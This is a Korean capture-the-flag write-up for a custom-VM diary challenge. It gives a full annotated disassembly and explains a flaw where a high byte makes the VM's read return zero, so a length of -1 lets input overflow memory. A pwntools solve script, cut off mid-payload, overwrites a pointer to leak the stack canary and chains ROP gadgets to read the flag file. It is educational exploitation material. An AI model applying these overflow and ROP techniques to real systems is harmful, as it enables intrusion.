# Index

- [Summary](#Summary)
- [Analysis](#Analysis)
- [Exploit](#Exploit)
- [Solve](#Solve)
- [Comment](#Comment)



# Summary

- **Improper Input Validation**
- **ROP**



# Analysis

wowowooww 드디어 마지막 문제입니다. 이제 어느정도 짬이 생겨서 그런지 어셈코드는 금방 해석해낼 수 있게되었습니다. 본 문제 역시 앞서 있었던 문제들과 마찬가지로 짱짱한 **DIsassembler**를 구현하여 **디컴파일**해줍시당. 이전 버전보다 `jmp`나 `call`시 주소 값을 표기해 줄 수 있도록 했습니다.

```asm
전역변수
0x59000		저장된 diary 개수
0x59003		1번 diary 주소
0x59006		2번 diary 주소
0x59009		3번 diary 주소
...

자주 사용되는 용도
bp-0x9	=	diary_addr
bp-0x6	=	buffer/index/allocated address 저장
bp-0x3	=	canary


_start() 
   0 :  sub r12, #0x3
   5 :  mov3 r2, #0x6
   a :  mov3 r1, r12
   c :  mov3 r0, #0x4
  11 :  syscall 0				# 	allocation()
  13 :  mov3 r10, [r1]
  15 :  mov3 r0, #0x5
  1a :  syscall r0				#	random()
  1c :  mov3 r9, r0				#	r9 = canary
  1e :  call [r13+ #0x4](0x27)	# 	main()
  23 :  xor r0, r0
  25 :  syscall r0				# 	exit(0)
  
 _main()
  27 :  push r11
  29 :  mov3 r11, r12
  2b :  sub r12, #0x6
  30 :  mov3 r5, r11
  32 :  sub r5, #0x3
  37 :  mov3 [r5], r9					#	*(bp-0x3) = canary
  39 :  mov3 r0, #0x6c3
  3e :  call [r13+ #0x61e](0x661)		#	call _print("==....secret....===")
  43 :  call [r13+ #0xa2](0xea)			#	call _initializing()
  48 :  mov3 r0, #0x9a7
  4d :  call [r13+ #0x60f](0x661)		#	call _print("1) list 2)...")
  52 :  mov3 r5, r11
  54 :  sub r5, #0x6
  59 :  mov3 [r5], r15
  5b :  mov3 r1, #0x3
  60 :  mov3 r0, r5
  62 :  call [r13+ #0x5a8](0x60f)		# 	call _read(0, bp-0x6, 3)
  67 :  mov3 r5, r11
  69 :  sub r5, #0x6
  6e :  mov1 r6, [r5]
  70 :  cmp1 r6, #0x31					#	'1'
  75 :  jne [r13+ #0xa](0x84)
  7a :  call [r13+ #0xaf](0x12e)		#	call _list()
  7f :  jmp [r13+ #0x4b](0xcf)
  84 :  cmp1 r6, #0x32					#	'2'
  89 :  jne [r13+ #0xa](0x98)
  8e :  call [r13+ #0x15d](0x1f0)		#	call _writing()
  93 :  jmp [r13+ #0x37](0xcf)
  98 :  cmp1 r6, #0x33					# 	'3'
  9d :  jne [r13+ #0xa](0xac)
  a2 :  call [r13+ #0x272](0x319)		#	call _show()
  a7 :  jmp [r13+ #0x23](0xcf)
  ac :  cmp1 r6, #0x34					#	'4'
  b1 :  jne [r13+ #0xa](0xc0)
  b6 :  call [r13+ #0x397](0x452)		#	call _edit()
  bb :  jmp [r13+ #0xf](0xcf)
  c0 :  cmp1 r6, #0x35					#	'5'
  c5 :  jne [r13+ #0x5](0xcf)
  ca :  jmp [r13+ #0x5](0xd4)			#	_quit()
  cf :  jmp [r13+ #0x1fff74](0x48)
  d4 :  mov3 r5, r11
  d6 :  sub r5, #0x3
  db :  mov3 r6, [r5]
  dd :  cmp r6, r9						#	check canary
  df :  jne [r13+ #0x4b9](0x59d)		#	_stack_fail()
  e4 :  mov3 r12, r11
  e6 :  pop r11
  e8 :  pop r13
  
 _initializing()						#	initializing()
  ea :  push r11
  ec :  mov3 r11, r12
  ee :  sub r12, #0x3
  f3 :  mov3 r5, r11
  f5 :  sub r5, #0x3
  fa :  mov3 [r5], r9					#	*(bp-0x3) = canary
  fc :  mov3 r5, r10
  fe :  mov3 [r5], r15
 100 :  mov3 r5, r10
 102 :  add r5, #0x3
 107 :  mov3 r2, #0x1e					#	r2 = 0x1e
 10c :  mov3 r1, #0x0					#	r1 = 0
 111 :  mov3 r0, r5						#	r0 = 0x1003
 113 :  call [r13+ #0x493](0x5ab)		#	call memset(0x1003, 0, 0x1e)
 118 :  mov3 r5, r11
 11a :  sub r5, #0x3
 11f :  mov3 r6, [r5]
 121 :  cmp r6, r9						# 	check canary
 123 :  jne [r13+ #0x475](0x59d)		#	call _stack_fail()
 128 :  mov3 r12, r11
 12a :  pop r11
 12c :  pop r13
 
_list()						#	_list()
 12e :  push r11
 130 :  mov3 r11, r12
 132 :  sub r12, #0x9
 137 :  mov3 r5, r11
 139 :  sub r5, #0x3
 13e :  mov3 [r5], r9		#	*(bp-0x3) = canary
 140 :  mov3 r5, r11
 142 :  sub r5, #0x6
 147 :  mov3 r6, #0x1
 14c :  mov3 [r5], r6		#	*(bp-0x6) = 1  초기 1
 14e :  mov3 r0, #0x8d6
 153 :  call [r13+ #0x509](0x661)		#	print("YOUR DIARY...")
 158 :  mov3 r0, #0x8e3
 15d :  call [r13+ #0x4ff](0x661)		#	print("------...")
_jmp
 162 :  mov3 r5, r11
 164 :  sub r5, #0x6
 169 :  mov3 r6, [r5]					#	r6 = *(bp-0x6) <= index
 16b :  mov3 r5, r10
 16d :  mov3 r7, [r5]					#	r7 = *(0x59000) <= 저장된 diary 개수
 16f :  cmp r6, r7						#	index > 저장된 diary 개수
 171 :  ja [r13+ #0x5a](0x1d0)		
 176 :  mov3 r5, r11
 178 :  sub r5, #0x9
 17d :  mov3 r7, r6			
 17f :  add r7, #0x30					#	r7 = r6 + 0x30
 184 :  mov1 [r5], r7					#	*(bp-0x9) = r7		"1"
 186 :  inc r5							#	r5 = bp-0x8
 188 :  mov3 r7, #0x29					#	r7 = 0x29
 18d :  mov1 [r5], r7					#	*(bp-0x8) = 0x29	")"
 18f :  inc r5							#	r5 = bp-0x7
 191 :  mov1 [r5], r15					#	*(bp-0x7) = 0      "\x00"
 193 :  mov3 r5, r11
 195 :  sub r5, #0x9
 19a :  mov3 r0, r5
 19c :  call [r13+ #0x4c0](0x661)		#	print(bp-0x9)
 1a1 :  mov3 r5, r11
 1a3 :  sub r5, #0x6
 1a8 :  mov3 r0, [r5]					#	r0 = *(bp-0x6)
 1aa :  call [r13+ #0x505](0x6b4)		#	r0 = *(0x59000 + (*(bp-0x6))*0x3)
 1af :  call [r13+ #0x4ad](0x661)		#	print(r0)
 1b4 :  mov3 r0, #0x9d2
 1b9 :  call [r13+ #0x4a3](0x661)		#	print("\n")
 1be :  mov3 r5, r11
 1c0 :  sub r5, #0x6
 1c5 :  mov3 r6, [r5]					#	r6 = *(bp-0x6)
 1c7 :  inc r6
 1c9 :  mov3 [r5], r6					#	*(bp-0x6)++ <= index로 사용됨
 1cb :  jmp [r13+ #0x1fff92](0x162)		# 	반복
 1d0 :  mov3 r0, #0x8e3
 1d5 :  call [r13+ #0x487](0x661)		#	print("------.....")
 1da :  mov3 r5, r11
 1dc :  sub r5, #0x3
 1e1 :  mov3 r6, [r5]						
 1e3 :  cmp r6, r9						# 	check canary
 1e5 :  jne [r13+ #0x3b3](0x59d)		#	_stack_fail()
 1ea :  mov3 r12, r11
 1ec :  pop r11
 1ee :  pop r13
 
_writing()							#		call writing()
 1f0 :  push r11
 1f2 :  mov3 r11, r12
 1f4 :  sub r12, #0x6
 1f9 :  mov3 r5, r11
 1fb :  sub r5, #0x3
 200 :  mov3 [r5], r9				#	*(bp-0x3) = canary
 202 :  mov3 r5, r10
 204 :  mov3 r6, [r5]				#	r6 = *(0x59000) # diary 개수
 206 :  cmp r6, #0x9				#	r6 < 0x9
 20b :  jb [r13+ #0xf](0x21f)
 210 :  mov3 r0, #0x919
 215 :  call [r13+ #0x447](0x661)	#	print("no you can't...max : 9")
 21a :  jmp [r13+ #0xe4](0x303)		#	return
_jmp
 21f :  inc r6
 221 :  mov3 [r5], r6				#	*(0x59000)++	diary 개수 증가
 223 :  mov3 r2, #0x6
 228 :  mov3 r5, r11
 22a :  sub r5, #0x6
 22f :  mov3 r1, r5
 231 :  mov3 r0, #0x4
 236 :  syscall 0					#	sys_allocate(bp-0x6, 6) 
 238 :  mov3 r5, r11				# 	*(bp-0x6) = 할당받은 주소
 23a :  sub r5, #0x6
 23f :  mov3 r7, [r5]				#	r7 = 할당받은 주소
 241 :  mov3 r5, r10
 243 :  mov3 r8, r6					#	r8 = diary 개수
 245 :  mul r8, #0x3				#	r8 *= 0x3
 24a :  add r5, r8
 24c :  mov3 [r5], r7				#	*(0x59000 + diary 개수*3) = 할당받은 주소
 24e :  mov3 r0, #0x932
 253 :  call [r13+ #0x409](0x661)	#	print("title>")
 258 :  mov3 r5, r11
 25a :  sub r5, #0x6
 25f :  mov3 r6, [r5]				#	r6 = *(bp-0x6)
 261 :  mov3 r1, #0x1e
 266 :  mov3 r0, r6
 268 :  call [r13+ #0x3a2](0x60f)	#	call _read(0, *(bp-0x6), 0x1e)
 26d :  dec r0
 26f :  mov3 r5, r11
 271 :  sub r5, #0x6
 276 :  mov3 r6, [r5]
 278 :  add r6, r0					#	문자열 null 추가
 27a :  mov1 [r6], r15				#	*(*(0x59000 + diary 개수*3)+입력개수-1) = null
 27c :  mov3 r0, #0x941
 281 :  call [r13+ #0x3db](0x661)	#	print("content, secret key..")
 286 :  mov3 r5, r11
 288 :  sub r5, #0x6
 28d :  mov3 r6, [r5]				
 28f :  add r6, #0x1e
 294 :  mov3 r1, #0x4b0
 299 :  mov3 r0, r6
 29b :  call [r13+ #0x36f](0x60f)	#	call _read(0, *(bp-0x6)+0x1e, 0x4b0)
 2a0 :  dec r0						#	return = 입력한 문자열 개수
 2a2 :  mov3 r5, r11
 2a4 :  sub r5, #0x6
 2a9 :  mov3 r6, [r5]
 2ab :  add r6, #0x1e
 2b0 :  add r6, r0
 2b2 :  mov1 [r6], r15				#	문자열 null 추가
 2b4 :  mov3 r5, r11
 2b6 :  sub r5, #0x6
 2bb :  mov3 r6, [r5]
 2bd :  add r6, #0x4ec				#	r6 = *(bp-0x6)+0x4ec
 2c2 :  mov3 r1, r0
 2c4 :  mov3 r0, r6
 2c6 :  call [r13+ #0x344](0x60f)	#	call _read(0, r6, 이전 입력한 문자열 길이)
 2cb :  mov3 r5, r11
 2cd :  sub r5, #0x6
 2d2 :  mov3 r6, [r5]
 2d4 :  mov3 r7, r6
 2d6 :  add r6, #0x1e				#	r6 = content addr
 2db :  add r7, #0x4ec				#	r7 = secret key addr
 2e0 :  xor r8, r8
 2e2 :  cmp r8, #0x4b0				
 2e7 :  je [r13+ #0x17](0x303)		#	content xor secret key
 2ec :  xor r5, r5
 2ee :  xor r4, r4
 2f0 :  mov1 r5, [r6]				
 2f2 :  mov1 r4, [r7]
 2f4 :  xor r5, r4
 2f6 :  mov1 [r6], r5
 2f8 :  inc r6
 2fa :  inc r7
 2fc :  inc r8
 2fe :  jmp [r13+ #0x1fffdf](0x2e2)
_jmp
 303 :  mov3 r5, r11
 305 :  sub r5, #0x3
 30a :  mov3 r6, [r5]
 30c :  cmp r6, r9					#	check canary
 30e :  jne [r13+ #0x28a](0x59d)	#	_stack_fail()
 313 :  mov3 r12, r11
 315 :  pop r11
 317 :  pop r13
 
_show()								#	call show()
 319 :  push r11
 31b :  mov3 r11, r12
 31d :  sub r12, #0x4b9
 322 :  mov3 r5, r11
 324 :  sub r5, #0x3
 329 :  mov3 [r5], r9				#	*(bp-0x3) = canary
 32b :  mov3 r0, #0x97c
 330 :  call [r13+ #0x32c](0x661)	#	print("index>>")
 335 :  mov3 r1, #0x2
 33a :  mov3 r5, r11
 33c :  sub r5, #0x6
 341 :  mov3 r0, r5
 343 :  call [r13+ #0x2c7](0x60f)	#	_read(0, bp-0x6, 0x2)
 348 :  xor r6, r6
 34a :  mov3 r5, r11
 34c :  sub r5, #0x6
 351 :  mov1 r6, [r5]				#	r6 = index
 353 :  cmp1 r6, #0x31				#	"1"
 358 :  jb [r13+ #0xdf](0x43c)		#	return	
 35d :  cmp1 r6, #0x39				#	"9"
 362 :  ja [r13+ #0xd5](0x43c)		#	return
 367 :  sub1 r6, #0x30
 36c :  mov3 r5, r10
 36e :  mov3 r7, [r5]				#	r7 = diary 개수
 370 :  cmp r6, r7
 372 :  ja [r13+ #0xc5](0x43c)		#	return
 377 :  mov3 r0, r6
 379 :  call [r13+ #0x336](0x6b4)	#	return_diary_addr(index)
 37e :  mov3 r5, r11
 380 :  sub r5, #0x9
 385 :  mov3 [r5], r0				#	*(bp-0x9) = diary_addr
 387 :  mov3 r0, #0x8e3			
 38c :  call [r13+ #0x2d0](0x661)	#	print("--------...")
 391 :  mov3 r0, #0x939
 396 :  call [r13+ #0x2c6](0x661)	#	print("TITLE : ")
 39b :  mov3 r5, r11
 39d :  sub r5, #0x9
 3a2 :  mov3 r0, [r5]
 3a4 :  call [r13+ #0x2b8](0x661)	#	print(*(bp-0x9))
 3a9 :  mov3 r0, #0x9d2
 3ae :  call [r13+ #0x2ae](0x661)	#	print("\n")
 3b3 :  mov3 r0, #0x8e3
 3b8 :  call [r13+ #0x2a4](0x661)	#	print("--------...")
 3bd :  mov3 r2, #0x4b0
 3c2 :  mov3 r5, r11
 3c4 :  sub r5, #0x9
 3c9 :  mov3 r5, [r5]
 3cb :  add r5, #0x1e
 3d0 :  mov3 r1, r5
 3d2 :  mov3 r5, r11
 3d4 :  sub r5, #0x4b9
 3d9 :  mov3 r0, r5
 3db :  call [r13+ #0x1f9](0x5d9)	#	call memcpy(bp-0x4b9, *(bp-0x9)+0x1e, 0x4b0)
 3e0 :  mov3 r5, r11
 3e2 :  sub r5, #0x4b9
 3e7 :  mov3 r6, r5					#	r6 = bp-0x4b9
 3e9 :  mov3 r5, r11
 3eb :  sub r5, #0x9
 3f0 :  mov3 r7, [r5]
 3f2 :  add r7, #0x4ec				#	r7 = *(bp-0x9)+0x4ec
 3f7 :  xor r8, r8
 3f9 :  cmp r8, #0x4b0				#	r6 xor r7
 3fe :  je [r13+ #0x17](0x41a)		
 403 :  xor r5, r5
 405 :  xor r4, r4
 407 :  mov1 r5, [r6]
 409 :  mov1 r4, [r7]
 40b :  xor r5, r4
 40d :  mov1 [r6], r5
 40f :  inc r6
 411 :  inc r7
 413 :  inc r8
 415 :  jmp [r13+ #0x1fffdf](0x3f9)
_jmp
 41a :  mov3 r5, r11
 41c :  sub r5, #0x4b9
 421 :  mov3 r0, r5
 423 :  call [r13+ #0x239](0x661)	#	print(bp-0x4b9)
 428 :  mov3 r0, #0x9d2
 42d :  call [r13+ #0x22f](0x661)	#	print("\n")
 432 :  mov3 r0, #0x8e3
 437 :  call [r13+ #0x225](0x661)	#	print("---------....")
_jmp
 43c :  mov3 r5, r11
 43e :  sub r5, #0x3
 443 :  mov3 r6, [r5]
 445 :  cmp r6, r9					# 	check canary
 447 :  jne [r13+ #0x151](0x59d)	#	_stack_fail()
 44c :  mov3 r12, r11
 44e :  pop r11
 450 :  pop r13
 
_edit()								#	call _edit()
 452 :  push r11
 454 :  mov3 r11, r12
 456 :  sub r12, #0x9
 45b :  mov3 r5, r11
 45d :  sub r5, #0x3
 462 :  mov3 [r5], r9				# 	*(bp-0x3 = canary
 464 :  mov3 r0, #0x97c
 469 :  call [r13+ #0x1f3](0x661)	#	print("index>>")
 46e :  mov3 r1, #0x2
 473 :  mov3 r5, r11
 475 :  sub r5, #0x6
 47a :  mov3 r0, r5
 47c :  call [r13+ #0x18e](0x60f)	#	_read(0, bp-0x6, 0x2)
 481 :  xor r6, r6
 483 :  mov3 r5, r11
 485 :  sub r5, #0x6
 48a :  mov1 r6, [r5]
 48c :  cmp1 r6, #0x31				#	1
 491 :  jb [r13+ #0xf1](0x587)		#	return
 496 :  cmp1 r6, #0x39				#	9
 49b :  ja [r13+ #0xe7](0x587)		# 	return
 4a0 :  sub1 r6, #0x30
 4a5 :  mov3 r5, r10
 4a7 :  mov3 r7, [r5]
 4a9 :  cmp r6, r7					#	index > *(0x59000)
 4ab :  ja [r13+ #0xd7](0x587)		#	return
 4b0 :  mov3 r0, r6
 4b2 :  call [r13+ #0x1fd](0x6b4)	#	return_diary_addr(r6)
 4b7 :  mov3 r5, r11
 4b9 :  sub r5, #0x9
 4be :  mov3 [r5], r0				#	*(bp-0x9) = diary_addr
 4c0 :  mov3 r0, #0x932
 4c5 :  call [r13+ #0x197](0x661)	#	call print("title>")
 4ca :  mov3 r5, r11
 4cc :  sub r5, #0x9
 4d1 :  mov3 r6, [r5]
 4d3 :  mov3 r1, #0x1e
 4d8 :  mov3 r0, r6
 4da :  call [r13+ #0x130](0x60f)	#	call _read(0, *(bp-0x9), 0x1e)
 4df :  dec r0
 4e1 :  mov3 r5, r11
 4e3 :  sub r5, #0x9
 4e8 :  mov3 r6, [r5]		
 4ea :  add r6, r0
 4ec :  mov1 [r6], r15				#	문자열 null
 4ee :  mov3 r0, #0x965
 4f3 :  call [r13+ #0x169](0x661)	#	call print("content...")
 4f8 :  mov3 r5, r11
 4fa :  sub r5, #0x9
 4ff :  mov3 r6, [r5]
 501 :  add r6, #0x1e
 506 :  mov3 r1, #0x4b0
 50b :  mov3 r0, r6
 50d :  call [r13+ #0xfd](0x60f)	#	call _read(0, *(bp-0x9)+0x1e, 0x4b0)
 512 :  dec r0
 514 :  mov3 r5, r11
 516 :  sub r5, #0x9
 51b :  mov3 r6, [r5]
 51d :  add r6, #0x1e
 522 :  add r6, r0
 524 :  mov1 [r6], r15				#	문자열 null
 526 :  mov3 r0, #0x96f
 52b :  call [r13+ #0x131](0x661)	#	call print("secret key...")
 530 :  mov3 r5, r11
 532 :  sub r5, #0x9
 537 :  mov3 r6, [r5]
 539 :  add r6, #0x4ec
 53e :  mov3 r0, r6
 540 :  call [r13+ #0x11c](0x661)	#	call print(*(bp-0x9)+0x4ec)
 545 :  mov3 r0, #0x9d2
 54a :  call [r13+ #0x112](0x661)	#	call print("\n")
 54f :  mov3 r5, r11
 551 :  sub r5, #0x9
 556 :  mov3 r6, [r5]
 558 :  mov3 r7, r6
 55a :  add r6, #0x1e				#	r6 = *(bp-0x9)+0x1e		#	content
 55f :  add r7, #0x4ec				#	r7 = *(bp-0x9)+0x4ec	#	secret key
 564 :  xor r8, r8
 566 :  cmp r8, #0x4b0				#	r6 ^ r7
 56b :  je [r13+ #0x17](0x587)
 570 :  xor r5, r5
 572 :  xor r4, r4
 574 :  mov1 r5, [r6]
 576 :  mov1 r4, [r7]
 578 :  xor r5, r4
 57a :  mov1 [r6], r5		
 57c :  inc r6
 57e :  inc r7
 580 :  inc r8
 582 :  jmp [r13+ #0x1fffdf](0x566)
_jmp
 587 :  mov3 r5, r11
 589 :  sub r5, #0x3
 58e :  mov3 r6, [r5]
 590 :  cmp r6, r9					#	check canary
 592 :  jne [r13+ #0x6](0x59d)		#	_stack_fail()
 597 :  mov3 r12, r11
 599 :  pop r11
 59b :  pop r13
 
_stack_fail()						#	stack_fail()
 59d :  mov3 r0, #0x984
 5a2 :  call [r13+ #0xba](0x661)	# 	call print("***...stack smashing....")
 5a7 :  xor r0, r0
 5a9 :  syscall 0					#	exit(0)
 
_memset()							#	memset()
 5ab :  push r0
 5ad :  push r1
 5af :  push r2
 5b1 :  push r9
 5b3 :  cmp r2, #0x0
 5b8 :  je [r13+ #0xb](0x5c8)
 5bd :  mov1 [r0], r1
 5bf :  inc r0
 5c1 :  dec r2
 5c3 :  jmp [r13+ #0x1fffeb](0x5b3)
 5c8 :  pop r6
 5ca :  cmp r6, r9					#	check canary
 5cc :  jne [r13+ #0x1fffcc](0x59d)	#	stack_fail()
 5d1 :  pop r2
 5d3 :  pop r1
 5d5 :  pop r0
 5d7 :  pop r13
 
_memcpy()
 5d9 :  push r0
 5db :  push r1
 5dd :  push r2
 5df :  push r3
 5e1 :  push r9
 5e3 :  cmp r2, #0x0
 5e8 :  je [r13+ #0xf](0x5fc)
 5ed :  mov1 r3, [r1]
 5ef :  mov1 [r0], r3
 5f1 :  inc r0
 5f3 :  inc r1
 5f5 :  dec r2
 5f7 :  jmp [r13+ #0x1fffe7](0x5e3)
 5fc :  pop r6
 5fe :  cmp r6, r9
 600 :  jne [r13+ #0x1fff98](0x59d)
 605 :  pop r3
 607 :  pop r2
 609 :  pop r1
 60b :  pop r0
 60d :  pop r13
 
_read()
 60f :  push r1
 611 :  push r2
 613 :  push r3
 615 :  push r9
 617 :  mov3 r3, r1
 619 :  mov3 r2, r0
 61b :  mov3 r1, #0x0
 620 :  mov3 r0, #0x3
 625 :  syscall 0						# 	read(0, r0, r1)
 627 :  pop r6
 629 :  cmp r6, r9
 62b :  jne [r13+ #0x1fff6d](0x59d)
 630 :  pop r3
 632 :  pop r2
 634 :  pop r1
 636 :  pop r13
 
_write()								# write(1, r0, r1)
 638 :  push r1
 63a :  push r2
 63c :  push r3
 63e :  push r9
 640 :  mov3 r3, r1
 642 :  mov3 r2, r0
 644 :  mov3 r1, #0x1
 649 :  mov3 r0, #0x2
 64e :  syscall 0						#	write()
 650 :  pop r6
 652 :  cmp r6, r9
 654 :  jne [r13+ #0x1fff44](0x59d)
 659 :  pop r3
 65b :  pop r2
 65d :  pop r1
 65f :  pop r13
 
_print_content()
 661 :  push r0
 663 :  push r1
 665 :  push r9
 667 :  mov3 r1, r0
 669 :  call [r13+ #0x16](0x684)		# 	_strlen()
 66e :  xchg r0, r1
 670 :  call [r13+ #0x1fffc3](0x638)	#	_write()
 675 :  pop r6
 677 :  cmp r6, r9						#	check canary
 679 :  jne [r13+ #0x1fff1f](0x59d)		#	_stack_fail()
 67e :  pop r1
 680 :  pop r0
 682 :  pop r13
 
_strlen()
 684 :  push r1
 686 :  push r2
 688 :  push r9
 68a :  xor r1, r1
 68c :  xor r2, r2
 68e :  mov1 r2, [r0]
 690 :  cmp1 r2, #0x0
 695 :  je [r13+ #0x9](0x6a3)
 69a :  inc r0
 69c :  inc r1
 69e :  jmp [r13+ #0x1fffeb](0x68e)
 6a3 :  pop r6
 6a5 :  cmp r6, r9
 6a7 :  jne [r13+ #0x1ffef1](0x59d)
 6ac :  mov3 r0, r1
 6ae :  pop r2
 6b0 :  pop r1
 6b2 :  pop r13
 
_return_diary_addr
 6b4 :  mov3 r5, r10
 6b6 :  mov3 r6, r0					#	r6 = *(bp-0x6)
 6b8 :  mul r6, #0x3				#	r6 *= 0x3
 6bd :  add r5, r6					#	r5 = 0x59000 + r6
 6bf :  mov3 r0, [r5]				#	r0 = *(0x59000 + (*(bp-0x6))*0x3)
 6c1 :  pop r13
```

이제 어느정도 관록이 생긴 것 같으니 그냥 어셈으로만 살펴보도록 하겠습니당

>  **짬 타이거는 C 코드따윈 필요 없다귯!**



간단하게 요약하면 `Title`, `content`, `secret key`로 이루어진 **Diary**를 작성하는 프로그램입니다. 요런 구조로 진행됩니다.

```command
1) list
2) write
3) show
4) edit
5) quit
>
```



**Diary **작성 시, 페이지를 할당하여 `Title`, `content`, `secret key`를 입력받는데, 페이지는 다음 구조로 나뉘어 각기 저장됩니다. `content `는 최대 0x4b0 크기까지 저장가능하며, `secret key`는 입력한 `content `문자의 개수만큼 저장이 가능합니다. 

```
Title	|	content	|	secret key
0x0		0x1e		0x4ec
```

`secret key`까지 입력 받은 후, `content`에는 추가적인 절차가 들어갑니다. `secret key`에 걸맞게 `content`에는 `secret key`와 **XOR** 연산을 거친 값이 저장됩니다. `show()` 시에는 스택 공간으로 해당 값을 복사한 뒤, **복호화**하여 원래 값을 보여줍니다. **XOR** 연산을 진행하는 부분은 다음과 같이 구현되어있습니다.

```asm
 55a :  add r6, #0x1e				#	r6 = *(bp-0x9)+0x1e		#	content
 55f :  add r7, #0x4ec				#	r7 = *(bp-0x9)+0x4ec	#	secret key
 564 :  xor r8, r8
 566 :  cmp r8, #0x4b0				#	r6 ^ r7
 56b :  je [r13+ #0x17](0x587)
 570 :  xor r5, r5
 572 :  xor r4, r4
 574 :  mov1 r5, [r6]
 576 :  mov1 r4, [r7]
 578 :  xor r5, r4
 57a :  mov1 [r6], r5		
 57c :  inc r6
 57e :  inc r7
 580 :  inc r8
 582 :  jmp [r13+ #0x1fffdf](0x566)
```





# Exploit

본 바이너리의 취약점은 **input**에 대한 유효성 검사를 제대로 하지 않는 것에 있습니다. 

**VM 환경**의 **STDIN**은 다음과 같이 구현되어 있습니다.

```python
class Stdin:
    def read(self, size):
        res = ''
        buf = sys.stdin.readline(size)
        for ch in buf:
            if ord(ch) > 0b1111111:
                break
            if ch == '\n':
                res += ch
                break
            res += ch
        return res

    def write(self, data):
        return None
```

입력에 들어온 **stream**을 한바이트씩 붙여서 전달해줍니다. 개행문자 '\n'을 만났을 경우 뒤에 개행문자를 붙여준 뒤, 리턴합니다. 여기까지는 그냥 평상시보던 `read()`와 비슷한 것 같습니다. 

**그러나** 이때!, 입력된 값이 **0b1111111** 보다 크다면 **그냥 리턴합니다.**

`sys_s3()`으로 구현된 `read()`는 다음과 같이 구현되어있는데, **STDIN**에서 가져온 문자열의 길이를 `r0`에 저장합니다. 따라서 위의 **STDIN**과 `sys_s3()`을 통해서 `r0`에 0을 저장할 수 있게 되는 곳입니당

```python
def sys_s3(self): # read()
    fd = self.register.get_register('r1')
    buf = self.register.get_register('r2')
    size = self.register.get_register('r3')

    if 0 <= fd < len(self.pipeline):
        data = map(ord, self.pipeline[fd].read(size))
        self.write_memory(buf, data, len(data))
        self.register.set_register('r0', len(data) & 0b111111111111111111111)
    else:
        self.register.set_register('r0', 0)
```



0에 집착하는 이유는 다음과 같습니다. `read()` 이후에, 정상적인 경우 입력한 문자열 뒤에 개행문자 '\n'이 붙기 때문에, `r0`를 감소시켜 주는데, 개행문자가 붙지 않을 경우 실제 문자열의 길이보다 -1 이 되게 됩니다. 심지어 리턴 값이 0이라면 `r0`는 **-1이 되게 되는데**, 이 값이 차후에 `read()`의 `size` 값으로 사용되므로 어마무시한 오버플로우를 발생시킬 수 있습니다.

```asm
29b :  call [r13+ #0x36f](0x60f)	#	call _read(0, *(bp-0x6)+0x1e, 0x4b0)
2a0 :  dec r0						#	return = 입력한 문자열 개수
...
2c2 :  mov3 r1, r0
2c4 :  mov3 r0, r6
2c6 :  call [r13+ #0x344](0x60f)	#	call _read(0, r6, 이전 입력한 문자열 길이)
```



>  **Permission check** 를 양 쪽 끝 메모리들만 진행해서 마구마구 써버릴 수 있습니다.
>
> ```python
> def write_memory(self, addr, data, length):
>     if not length:
>         return
> 
>     if self.memory.check_permission(addr, PERM_WRITE) and self.memory.check_permission(addr + length - 1, PERM_WRITE): # identifying both ends
>         for offset in range(length):
>             self.memory[addr + offset] = data[offset] & 0b1111111 # fucking 7bits
>     else:
>         self.terminate("[VM] Can't write memory")
> ```



따라서 직접적으로 스택의 `pc`에 관여하는 것이 가능합니다. 하지만 랜덤 값 `canary`가 존재하기 때문에, 우선 카나리를 릭할 필요가 있습니다. 현재 할 수 있는 것은 `secret key` 입력 시 어마무시한 입력을 줄 수 있다는 점입니다. 이를 통해 **전역변수** 값을 **변조**시킬 수 있습니다.



할당되는 메모리 주소는 **pages** 딕셔너리 순서대로 진행됩니다. `writing()`시 0xc4000 부터 메모리 할당이 되는데, 해당 공간은 전역변수 메모리 공간보다 **높은 값**을 가지므로 덮어쓸 수 없습니다. 그러므로 적당히 할당시켜 적당한 메모리 공간에서 오버플로우를 일으킵시당. **3번째 공간을 타겟**으로 하여 0x59000 메모리 공간에 있는 **할당받은 메모리 주소를 저장하는 공간(0x59003)**을 **카나리가 존재하는 주소(0xf5fb6)**로 변조시켜 `list()` 기능으로 **canary leak**을 수행하였습니다. 0xf5fb6 은 `read()`의 카나리 주소입니다.

```
allocated page :

0x0			# <== .text
0x1000		# <== .text
0x59000		# <== 전역변수 메모리 공간
0xc4000 	# 1
0x1c000		# 2
0x3a000		# 3
0xdd000
0x9b000
```



## Scenario

따라서 시나리오는 다음과 같습니다.

1. *(0x59003) -> canary 주소로 변조
2. 해당 주소는 `list()`에서 `Title` 출력 시 사용하므로 canary leak 가능
3. ROP를 이용하여 flag 파일을 open -> read -> write 





# Solve

```python
#!/usr/bin/python
from pwn import *

def int_to_str(oper):
	res = ''
	res += chr(oper & 0b1111111)
	res += chr((oper >> 14) & 0b1111111)
	res += chr((oper >> 7) & 0b1111111)
	return res

def str_to_int(oper):
	res = 0
	res |= (ord(oper[0]) & 0b1111111)
	res |= (ord(oper[1]) & 0b1111111) << 14
	res |= (ord(oper[2]) & 0b1111111) << 7
	return res


def writing(title, content, key):
	r.sendlineafter('>', '2')
	r.sendlineafter('>', title)
	r.sendlineafter('>', content)
	r.sendline(key)

def listing():
	r.sendlineafter('>', '1')

r = process('./vm_diary.py')
#context.log_level = 'debug'


writing('flag', 'AAAA', 'AAAA')		# 0xc4000
writing('AAAA', 'AAAA', 'AAAA')		# 0x1c000

###### diary addr overwrite ######
payload1 = 'a'*( (0x59000) - (0x3a000 + 0x4ec)) # bp = 0xf5fcb, 0xf5fb6 : read() canary 
payload1 += int_to_str(0x1)
payload1 += int_to_str(0xf5fb6)
writing('AAAA', '\xff', payload1)	# 0x3a000


###### leak canary ######
listing()
r.recvuntil('YOUR DIARY')
r.recvuntil('1)')

canary = str_to_int(r.recv(3))
success('canary = '+str(hex(canary)))

###### overwrite ROP chain ######
###### open -> read -> write ######
'''
 609 :  pop r1
 60b :  pop r0
 60d :  pop r13
 
 634 :  pop r1
 636 :  pop r13
 
 _write()
 64e :  syscall r0						
 650 :  pop r6
 652 :  cmp r6, r9
 654 :  jne [r13+ #0x1fff44](0x59d)
 659 :  pop r3
 65b :  pop r2
 65d :  pop r1
 65f :  pop r13
'''
payload2 = 'a'*( (0xf5fb6) - (0xdd000 + 0x4ec))	# 0xf5fb6 : read canary
payload2 += int_to_str(canary)
payload2 += int_to_str(0x0)		# dummy
payload2 += int_to_str(0x0)		# dummy
payload2 += int_to_str(0x0)		# dummy
payload2 += int_to_str(0x609)	# pc, pop r1(flag) r0(1) ret(syscall);

payload2 += int_to_str(0xc4000)
